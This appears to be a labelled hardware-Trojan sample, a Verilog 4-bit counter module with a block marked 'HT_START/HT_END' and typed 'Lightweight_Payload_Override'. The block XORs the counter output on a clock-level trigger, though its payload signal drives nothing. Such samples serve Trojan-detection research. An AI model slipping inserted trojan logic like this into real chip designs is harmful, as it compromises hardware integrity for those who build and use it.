modified_rtl:
    module counter
    (
    input clk,
    input rst_n,
    output reg [3:0] counter_out
);

    always @(posedge clk or negedge rst_n) begin
    if (~rst_n) begin
    counter_out <= 4'b0000;
end else begin
    counter_out <= counter_out + 1;
end
end

// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg [3:0] htrojan_pay;
always @(*) begin
    htrojan_trig = (clk == 1'b1);
    htrojan_pay = htrojan_trig ? (counter_out ^ 4'h1) : counter_out;
end
// HT_END
endmodule
